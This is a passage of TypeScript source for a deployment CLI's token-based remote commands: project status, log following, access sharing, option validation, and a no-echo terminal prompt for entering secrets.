  const listed = await transport.list(slug);
  if (!listed.ok) {
    warnOn(output, `cannot tell which runtime secrets are set: ${listed.failure.message}`, []);
    return null;
  }
  const view = store.withDeclared(listed.value, declaration);
  const before = store.missingOf(view);
  const left = await store.handleMissing(view, transport, io);
  if (left.runtime.length === before.runtime.length) return left;
  const answer = await io.ask("Restart the service now, so that it reads them? [y/N] ");
  if (answer === null || !/^y(es)?$/i.test(answer.trim())) {
    output.say("   not restarted: sitesolide restart applies them");
    return left;
  }
  const restarted = await transport.restart(slug);
  if (!restarted.ok) warnOn(output, `the restart was not made: ${restarted.failure.message}`, ["sitesolide restart, once its cause is fixed"]);
  else output.say(`   ${store.verdictWords(restarted.value.verdict)}`);
  return left;
}

/** One service of a project, as the control API reports it. */
type ServiceState = {
  name: string | null;
  state: string;
  subState: string;
  port: number | null;
  /** Absent from a dashboard from before workers and scheduled services: every service was a server then. */
  kind?: "server" | "worker" | "scheduled";
};

type ProjectStatus = {
  slug: string;
  access: string;
  deployed: boolean;
  type: string | null;
  url: string | null;
  /** Absent from a dashboard from before it: read from `portal` then. */
  general?: "public" | "restricted" | "code" | null;
  portal: { wanted: boolean; installed: boolean } | null;
  services: ServiceState[];
};

/**
 * The SERVICE column of a project: `active` when everything that should run
 * does, the states that differ otherwise. A scheduled service is inactive
 * between two runs and active during one, neither of which says anything is
 * wrong: only a failed run counts. A project whose every service is
 * scheduled, none failed, reads `scheduled`.
 */
export function serviceWord(services: readonly ServiceState[]): string {
  if (services.length === 0) return "-";
  const counted = services.filter((service) => service.kind !== "scheduled" || service.state === "failed");
  if (counted.length === 0) return "scheduled";
  return counted.every((service) => service.state === "active") ? "active" : counted.map((service) => service.state).join(",");
}

/** Who may open the site, in the words of the dashboard's Access section. */
export function generalWord(project: Pick<ProjectStatus, "general" | "portal" | "deployed">): string {
  const general = project.general !== undefined ? project.general : project.portal === null ? null : project.portal.installed ? "restricted" : "public";
  if (!project.deployed || general === null) return "-";
  return { public: "Public", restricted: "Restricted", code: "Anyone with the code" }[general];
}

async function status(remote: Remote, dependencies: RemoteDependencies): Promise<number> {
  const output = dependencies.output ?? humanOutput;
  const who = await call<{ identity: Identity }>(remote, "/api/v1/whoami", {}, dependencies.fetcher);
  if (!who.ok) return report(output, who.failure);
  output.say(`=== ${remote.api}`);
  for (const line of describeIdentity(who.body.identity)) output.say(line);
  const answer = await call<{ projects: ProjectStatus[] }>(remote, "/api/v1/projects", {}, dependencies.fetcher);
  if (!answer.ok) return report(output, answer.failure);
  output.say("");
  output.say(`${"PROJECT".padEnd(22)} ${"TYPE".padEnd(7)} ${"SERVICE".padEnd(10)} ${"GENERAL ACCESS".padEnd(21)} ADDRESS`);
  for (const project of answer.body.projects) {
    const service = serviceWord(project.services);
    output.say(`${project.slug.padEnd(22)} ${(project.type ?? (project.deployed ? "?" : "-")).padEnd(7)} ${service.padEnd(10)} ${generalWord(project).padEnd(21)} ${project.url ?? "not deployed"}`);
  }
  output.succeeded("status", { api: remote.api, identity: who.body.identity, projects: answer.body.projects });
  return 0;
}

async function logs(remote: Remote, dependencies: RemoteDependencies, follow: boolean, lines: number): Promise<number> {
  const output = dependencies.output ?? humanOutput;
  const path = join(dependencies.folder, "sitesolide.json");
  if (!existsSync(path)) return report(output, { error: "invalid", message: `sitesolide.json not found in ${dependencies.folder}: run this from the project's folder` });
  const { manifest } = checkManifest(readFileSync(path, "utf8"));
  if (manifest === undefined) return report(output, { error: "invalid", message: "sitesolide.json rejected" });
  let cursor: string | null = null;
  let entries = 0;
  const pause = dependencies.pause ?? (() => Bun.sleep(2000));
  for (;;) {
    const parameters: Record<string, string> = cursor === null ? { lines: String(lines) } : { lines: "500", cursor };
    const query = new URLSearchParams(parameters);
    const answer: Answer<{ lines: string[]; cursor: string | null }> = await call(remote, `/api/v1/projects/${encodeURIComponent(manifest.slug)}/logs?${query}`, {}, dependencies.fetcher);
    if (!answer.ok) return report(output, answer.failure);
    for (const line of answer.body.lines) output.journal(line);
    entries += answer.body.lines.length;
    cursor = answer.body.cursor;
    if (!follow) {
      output.succeeded("logs", { slug: manifest.slug, entries, cursor });
      return 0;
    }
    await pause();
  }
}

/**
 * A dashboard from before a route answers it from its catch-all, `not-found`
 * "no such route": said as what it is, a machine that does not carry it yet,
 * rather than a project the token cannot see.
 */
function predatesRoute(answer: Answer<unknown>): boolean {
  return !answer.ok && answer.failure.error === "not-found" && answer.failure.message.startsWith("no such route");
}

/**
 * Access through the control API: the steward judges the token and the
 * access rules, a token giving Can open alone.
 */
export function apiAccess(remote: Remote, fetcher?: Fetch): AccessTransport {
  const path = (slug: string) => `/api/v1/projects/${encodeURIComponent(slug)}/access`;
  const outdated = (answer: Answer<unknown>): Reading<never> | null =>
    predatesRoute(answer)
      ? { ok: false, failure: { error: "not-available", message: `the dashboard at ${remote.api} does not carry access yet: the owner of the machine runs sitesolide upgrade` } }
      : null;
  const change = async (slug: string, method: "PUT" | "DELETE", body: object): Promise<Reading<EntryAnswer>> => {
    const answer: Answer<EntryAnswer> = await call(remote, path(slug), { method, headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) }, fetcher);
    const old = outdated(answer);
    if (old !== null) return old;
    if (!answer.ok) return { ok: false, failure: answer.failure };
    if (typeof answer.body !== "object" || answer.body === null || typeof answer.body.change !== "string") {
      return { ok: false, failure: { error: "unreadable", message: `${remote.api} answered with something that is not the control API's access` } };
    }
    return { ok: true, value: answer.body };
  };
  return {
    via: `through ${remote.api}`,
    owner: false,
    // A token gives Can open alone: the line to send names the site, not the dashboard.
    dashboard: null,
    async list(slug) {
      const answer: Answer<{ access: AccessState }> = await call(remote, path(slug), {}, fetcher);
      const old = outdated(answer);
      if (old !== null) return old;
      if (!answer.ok) return { ok: false, failure: answer.failure };
      const state = answer.body.access;
      if (typeof state !== "object" || state === null || typeof state.url !== "string" || !Array.isArray(state.entries)) {
        return { ok: false, failure: { error: "unreadable", message: `${remote.api} answered with something that is not the control API's access` } };
      }
      return { ok: true, value: state };
    },
    give: (slug, who, role) => change(slug, "PUT", { who, role }),
    remove: (slug, who) => change(slug, "DELETE", { who }),
  };
}

// --- secrets and restarts --------------------------------------------------------
//
// `sitesolide secrets` and `sitesolide restart` live in ./store-cli, one parser
// and one renderer for SSH and the API: runRemote hands them this folder's
// slug and the API's transport. What stays here is the prompt that does not
// echo, which `login` reads a token with too.

/**
 * How the no-echo prompt ends: the value entered, null when it was abandoned,
 * or a refusal saying why, nothing sent.
 */
export type Typed = string | null | { refused: string };

/** Where a line typed without echo stands: the value so far, and `typed` once it ended. */
export type Keying = { value: string; typed?: Typed };

const SEVERAL_LINES = "more than one line arrived at the prompt, a paste of several lines";

/** A control key in words: it is a key pressed, not a part of a value. */
function keyName(character: string): string {
  const code = character.codePointAt(0)!;
  if (character === "\t") return "Tab";
  if (code < 0x20) return `Ctrl-${String.fromCharCode(code + 0x40)}`;
  return `a control character, U+${code.toString(16).toUpperCase().padStart(4, "0")},`;
}

/**
 * One more piece of what was typed, read the way a shell's prompt edits a
 * line. In raw mode the terminal edits nothing: taken as they come, Ctrl-U,
 * Ctrl-W, Ctrl-Z and an arrow's escape sequence would go into the value as
 * characters, which the steward accepts, and the service would read a secret
 * nobody had meant. So Backspace, Ctrl-U and Ctrl-W edit, Enter ends, Ctrl-C and Ctrl-D
 * abandon, and any other control key is refused rather than guessed at.
 *
 * Anything after the line's end is refused too: a paste of several lines
 * would otherwise keep its first line silently.
 */
export function keyIn(value: string, text: string): Keying {
  const characters = Array.from(text);
  let line = Array.from(value);
  for (let i = 0; i < characters.length; i++) {
    const character = characters[i]!;
    if (character === "\u0003" || character === "\u0004") return { value: "", typed: null };
    if (character === "\r" || character === "\n") {
      // A pasted Windows line ends in both: one line still.
      const rest = characters.slice(character === "\r" && characters[i + 1] === "\n" ? i + 2 : i + 1);
      if (rest.length > 0) return { value: "", typed: { refused: SEVERAL_LINES } };
      return { value: line.join(""), typed: line.join("") };
    }
    if (character === "\u007f" || character === "\b") line = line.slice(0, -1);
    else if (character === "\u0015") line = [];
    else if (character === "\u0017") {
      // As readline's unix-word-rubout: the blanks before the cursor, then the word.
      while (line.length > 0 && /\s/u.test(line.at(-1)!)) line.pop();
      while (line.length > 0 && !/\s/u.test(line.at(-1)!)) line.pop();
    } else if (character === "\u001b") return { value: "", typed: { refused: "an arrow key or another escape sequence was typed at the prompt, which takes none" } };
    else if (/\p{Cc}/u.test(character)) return { value: "", typed: { refused: `${keyName(character)} was typed at the prompt, which takes no control key` } };
    else line.push(character);
  }
  return { value: line.join("") };
}

/** The terminal the prompt reads, injectable so that its tests drive every way it ends. */
export type HiddenTerminal = {
  /** Raw mode: no echo, no line editing, Ctrl-C a character rather than a signal. */
  setRawMode: (raw: boolean) => void;
  /** Hands over what arrives, and `end` when the input closes, until the function returned is called. */
  listen: (data: (chunk: Uint8Array) => void, end: () => void) => () => void;
  /** Standard error: standard output carries the events of --json. */
  write: (text: string) => void;
  /** Runs `restore` on SIGINT, SIGTERM and SIGHUP, until the function returned is called. */
  onSignals: (restore: () => void) => () => void;
};

const PROMPT_SIGNALS = ["SIGINT", "SIGTERM", "SIGHUP"] as const;

/** The process's own: standard input in raw mode, the question on standard error. */
export function processTerminal(): HiddenTerminal {
  const input = process.stdin;
  return {
    setRawMode: (raw) => {
      input.setRawMode(raw);
    },
    listen(data, end) {
      const onData = (chunk: Uint8Array | string) => data(typeof chunk === "string" ? new TextEncoder().encode(chunk) : chunk);
      input.on("data", onData);
      input.on("end", end);
      input.resume();
      return () => {
        input.off("data", onData);
        input.off("end", end);
        input.pause();
      };
    },
    write: (text) => {
      process.stderr.write(text);
    },
    onSignals(restore) {
      const handlers = PROMPT_SIGNALS.map((signal) => {
        const handler = () => {
          restore();
          off();
          // Raised again with no handler left, so the run ends as the signal
          // meant, its exit status included, once the terminal echoes again:
          // a run killed in raw mode left the shell typing blind.
          process.kill(process.pid, signal);
        };
        process.on(signal, handler);
        return [signal, handler] as const;
      });
      const off = () => {
        for (const [signal, handler] of handlers) process.off(signal, handler);
      };
      return off;
    },
  };
}

/**
 * How long the prompt keeps reading once the line has ended. A paste arrives
 * in one burst, a few chunks apart by well under this; a person's next key,
 * after Enter, comes far later. What arrives meanwhile is read and dropped
 * here, rather than left for the shell to echo, run and keep in its history.
 */
export const PROMPT_QUIET_MS = 100;

/** However long a paste keeps arriving, the terminal is given back after this. */
const PROMPT_DRAIN_MAX_MS = 2_000;

/**
 * A value typed at the terminal, never echoed, in raw mode as
 * dashboard/scripts/fingerprint.ts reads a password, edited as `keyIn` says.
 *
 * The terminal is given back its echo however the prompt ends: Enter, Ctrl-C,
 * a refusal, the input closing, an exception (the `finally`), or a signal,
 * which raw mode no longer sends for Ctrl-C but `kill` and a closed window
 * still do.
 */
export async function promptWithoutEcho(question: string, terminal: HiddenTerminal = processTerminal(), quietMs = PROMPT_QUIET_MS): Promise<Typed> {
  let raw = false;
  let stopListening = (): void => {};
  let stopSignals = (): void => {};
  let quiet: ReturnType<typeof setTimeout> | undefined;
  let longest: ReturnType<typeof setTimeout> | undefined;
  let finish: (typed: Typed) => void = () => {};
  const restore = (): void => {
    clearTimeout(quiet);
    clearTimeout(longest);
    stopListening();
    stopListening = () => {};
    stopSignals();
    stopSignals = () => {};
    if (!raw) return;
    raw = false;
    terminal.setRawMode(false);
    terminal.write("\n");
  };
  try {
    const typed = new Promise<Typed>((resolve) => {
      finish = resolve;
    });
    terminal.write(question);
    stopSignals = terminal.onSignals(() => {
      restore();
      finish(null);
    });
    terminal.setRawMode(true);
    raw = true;

    const decoder = new TextDecoder("utf-8", { fatal: true });
    let value = "";
    /** Decided, and still reading what follows: `undefined` while typing. */
    let outcome: Typed | undefined;
    /** The line ended on a carriage return whose line feed may come in the next read. */
    let feedDue = false;
    const done = () => finish(outcome === undefined ? null : outcome);
    const drain = () => {
      clearTimeout(quiet);
      quiet = setTimeout(done, quietMs);
    };
    const decide = (decided: Typed) => {
      outcome = decided;
      longest = setTimeout(done, PROMPT_DRAIN_MAX_MS);
      drain();
    };
    stopListening = terminal.listen(
      (chunk) => {
        try {
          if (outcome !== undefined) {
            const feed = feedDue && chunk.length === 1 && chunk[0] === 0x0a;
            feedDue = false;
            // The rest of a paste: the line it follows was not the whole value.
            if (typeof outcome === "string" && !feed) outcome = { refused: SEVERAL_LINES };
            drain();
            return;
          }
          let text: string;
          try {
            text = decoder.decode(chunk, { stream: true });
          } catch {
            decide({ refused: "what arrived at the prompt is not valid UTF-8" });
            return;
          }
          const step = keyIn(value, text);
          value = step.value;
          if (step.typed === undefined) return;
          feedDue = typeof step.typed === "string" && text.endsWith("\r");
          decide(step.typed);
        } catch {
          // Thrown here, nothing would reach the `finally`: the run would end in raw mode.
          outcome = null;
          done();
        }
      },
      () => {
        if (outcome === undefined) outcome = null;
        done();
      },
    );
    return await typed;
  } finally {
    restore();
  }
}

/**
 * This folder's project, from its manifest, as `share`, `secrets` and `logs`
 * read it: its slug, and whether it may have a store.
 */
function folderManifest(folder: string): Manifest | Failure {
  const path = join(folder, "sitesolide.json");
  if (!existsSync(path)) return { error: "invalid", message: `sitesolide.json not found in ${folder}: run this from the project's folder` };
  const { manifest } = checkManifest(readFileSync(path, "utf8"));
  if (manifest === undefined) return { error: "invalid", message: "sitesolide.json rejected" };
  return manifest;
}

/** All of standard input, as bytes. */
async function standardInput(): Promise<Uint8Array> {
  return Bun.stdin.bytes();
}

/** What a command that needs the machine's root says through the API. */
export function needsSsh(command: string): Failure {
  return {
    error: "needs-ssh",
    message: `sitesolide ${command} needs the owner's SSH access to the machine`,
    details: [
      "with a token, this workstation runs: deploy, status, logs, share, secrets, restart, login",
      "ask the owner of the machine, who runs it from a workstation configured with sitesolide init",
    ],
  };
}

/**
 * The options each command takes through the API, and whether one carries a
 * value. Anything else is refused before a request leaves, rather than passed
 * over: `--dry-run` passed over deployed for real, the live site replaced by
 * a run its author believed changed nothing. A dry run needs the owner's SSH
 * reads, which a token does not have, and the control API has no route that
 * judges without deploying; until it does, the option is refused, saying so.
 */
const REMOTE_OPTIONS: Readonly<Record<string, Readonly<Record<string, boolean>>>> = {
  deploy: {},
  status: {},
  logs: { "--follow": false, "--lines": true },
  login: { "--url": true, "--token-stdin": false },
  share: SHARE_OPTIONS,
  // Read by readStoreArguments in ./store-cli, which never quotes what it refuses.
  secrets: { "--stdin": false, "--restart": false, "--format": true, "--bytes": true, "--replace": false },
  restart: {},
};

/** Every command takes these two: they choose the output and the mode, read before here. */
const GLOBAL_OPTIONS = ["--json", "--api"];

/** The refusal of an option the command does not take through the API, or null. */
export function unknownOptions(command: string, arguments_: string[]): Failure | null {
  const known = REMOTE_OPTIONS[command] ?? {};
  const rest = arguments_[0] === command ? arguments_.slice(1) : arguments_;
  for (let i = 0; i < rest.length; i++) {
    const option = rest[i]!;
    if (GLOBAL_OPTIONS.includes(option)) continue;
    if (Object.hasOwn(known, option)) {
      if (known[option]) i++;
      continue;
    }
    if (!option.startsWith("-")) continue;
    if (command === "deploy" && option === "--dry-run") {
      return {
        error: "no-dry-run",
        message: "deploy --dry-run is not available with a token: nothing was sent",
        details: [
          "a dry run reads the machine over the owner's SSH access, which a token does not carry",
          "through the API, the machine judges the manifest when the deployment starts, before anything is built or uploaded",
          "review sitesolide.json, then run sitesolide deploy",
        ],
      };
    }
    const takes = Object.keys(known);
    return {
      error: "unknown-option",
      message: `${option}: not an option of sitesolide ${command} with a token: nothing was sent`,
      details: [
        takes.length === 0 ? `with a token, sitesolide ${command} takes no option` : `with a token, sitesolide ${command} takes ${takes.join(", ")}`,
        ...(option === "--yes" || option === "--slug" ? ["a folder without sitesolide.json: write it first with sitesolide detect --write, review it, then deploy"] : []),
      ],
    };
  }
  return null;
}

/** The commands only the owner's SSH access carries. */
export const SSH_COMMANDS = ["lock", "unlock", "domain", "remove", "run", "people", "refresh", "backups"];

export const REMOTE_USAGE = [
  "usage, with a token:",
  "  sitesolide login --url <https://dashboard.zone>   keep the token, check it",
  "     --token-stdin                                  read it from standard input",
  "  sitesolide deploy                                 build here, upload, follow the machine's log",
  "  sitesolide status                                 the projects this token may deploy",
  "  sitesolide logs [--follow]                        the journal of this folder's project",
  "     --lines <n>                                    how many lines back, 50 by default, 500 at most",
  "  sitesolide share                                  this folder's project's general access and people with access",
  "     <email|@domain>...                             give them Can open: people inside the company's domains, or one of them",
  "     --remove <email|@domain>...                    take their Can open away",
  "  sitesolide secrets                                this folder's project's secrets: names, sources, states, never a value",
  "  sitesolide secrets set <NAME>                     set a variable in the project's store, typed at a prompt that does not echo it",
  "     --stdin                                        the value from standard input, one trailing line break dropped",
  "  sitesolide secrets generate <NAME>                a random value drawn on the server, never shown",
  "     --format hex|base64url --bytes <16-64>         hex and 32 bytes by default",
  "     --replace                                      draw a new one over a value already set",
  "  sitesolide secrets remove <NAME>...               take variables out of the store",
  "  sitesolide secrets set-file <NAME> < path         a file read whole, 64 KiB at most, read at $CREDENTIALS_DIRECTORY/files_<NAME>",
  "  sitesolide secrets remove-file <NAME>             take a file out of the store",
  "     --restart                                      with any change: then restart the service, and say whether it holds",
  "  sitesolide restart                                restart this folder's project's service, and say whether it holds",
  "",
  "--json, on every one of them: one JSON event per line, see docs/agents.md",
  "a secret's value never goes on the command line: with --json, secrets set needs --stdin",
  "SITESOLIDE_API and SITESOLIDE_TOKEN, both in the environment, win over the files.",
];

/** Runs a command through the API; the exit code is returned, never thrown. */
export async function runRemote(command: string, arguments_: string[], dependencies: RemoteDependencies): Promise<number> {
  const output = dependencies.output ?? humanOutput;
  const remote = readRemote(dependencies.environment, dependencies.home ?? homedir());
  if (SSH_COMMANDS.includes(command)) return report(output, needsSsh(command));
  if (!["deploy", "status", "logs", "share", "secrets", "restart"].includes(command)) {
    const [title, ...usage] = REMOTE_USAGE;
    return report(output, { error: "usage", message: command === "" ? (title ?? "usage") : `unknown command with a token: ${command}`, details: command === "" ? usage : REMOTE_USAGE });
  }
  // `secrets` reads its own arguments: unknownOptions quotes the option it
  // refuses, and an argument of `secrets set` may be a value. Loaded here,
  // not at the top: ./store-cli reads this module's `call`.
  const store = command === "secrets" || command === "restart" || command === "deploy" ? await import("./store-cli") : null;
  const asked = command === "secrets" ? store!.readStoreArguments(arguments_, arguments_.includes("--json")) : null;
  if (asked !== null && "error" in asked) return report(output, asked);
  const refused = command === "secrets" ? null : unknownOptions(command, arguments_);
  if (refused !== null) return report(output, refused);
  const marker = arguments_.indexOf("--lines");
  const lines = marker === -1 ? "50" : (arguments_[marker + 1] ?? "");
  if (command === "logs" && (!/^[0-9]+$/.test(lines) || Number(lines) < 1 || Number(lines) > 500)) {
    return report(output, { error: "invalid", message: `--lines: ${lines || "nothing given"} is not a number of lines between 1 and 500, what the API returns at most` });
  }
  if ("missing" in remote) return report(output, { error: "unauthenticated", message: remote.missing });
  switch (command) {
    case "deploy":
      return deploy(remote, dependencies, arguments_.includes("--json"));
    case "status":
      return status(remote, dependencies);
    case "share":
    case "secrets":
    case "restart": {
      const manifest = folderManifest(dependencies.folder);
      if ("error" in manifest) return report(output, manifest);
      const slug = manifest.slug;
      if (command === "share") return share(arguments_, slug, apiAccess(remote, dependencies.fetcher), output);
      const transport = store!.apiStore(remote, dependencies.fetcher);
      if (command === "restart") return store!.restartCommand(slug, transport, output);
      if (!hasStore(manifest)) return report(output, store!.storelessRefusal(manifest));
      return store!.runStore(asked!, slug, transport, {
        output,
        json: arguments_.includes("--json"),
        terminal: dependencies.terminal ?? (() => process.stdin.isTTY === true),
        stdin: dependencies.stdinBytes ?? standardInput,
        secretPrompt: dependencies.secretPrompt ?? promptWithoutEcho,
      });
    }
    default:
      return logs(remote, dependencies, arguments_.includes("--follow"), Number(lines));
  }
}
